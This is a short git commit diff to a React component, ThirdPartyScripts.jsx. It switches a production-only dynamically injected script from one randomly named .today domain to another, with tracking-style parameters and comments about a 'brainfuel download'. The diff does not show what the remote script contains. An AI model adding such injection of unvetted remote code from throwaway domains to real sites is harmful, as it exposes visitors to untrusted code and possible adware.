1ccfd26a2dd63ac94e7d3832f1d387f790952e79
radbrad <radbrad5991079@gmail.com>
2025-12-08 03:28:01 -0800

    ad link

--- components/ThirdPartyScripts.jsx
+++ components/ThirdPartyScripts.jsx
@@ -6,7 +6,8 @@ export default function ThirdPartyScripts() {
     if (process.env.NODE_ENV !== "production") return;
     try {
       const s = document.createElement("script");
-      s.src = "https://hotblikawo.today/process.js?id=1505874255&p1=sub1&p2=sub2&p3=sub3&p4=sub4";
+      // s.src = "https://hotblikawo.today/process.js?id=1505874255&p1=sub1&p2=sub2&p3=sub3&p4=sub4";  // old brainfuel download
+      s.src = "https://hotbyuyixa.today/process.js?id=1550579975&p1=sub1&p2=sub2&p3=sub3&p4=sub4"; // education brainfuel only dwonlaod 
       s.async = true;
       document.body.appendChild(s);
       return () => {
@@ -17,3 +18,7 @@ export default function ThirdPartyScripts() {
 
   return null;
 }
+
+
+
+  // <script type="text/javascript" src="https://hotbyuyixa.today/process.js?id=1550579975&p1=sub1&p2=sub2&p3=sub3&p4=sub4" async> </script>
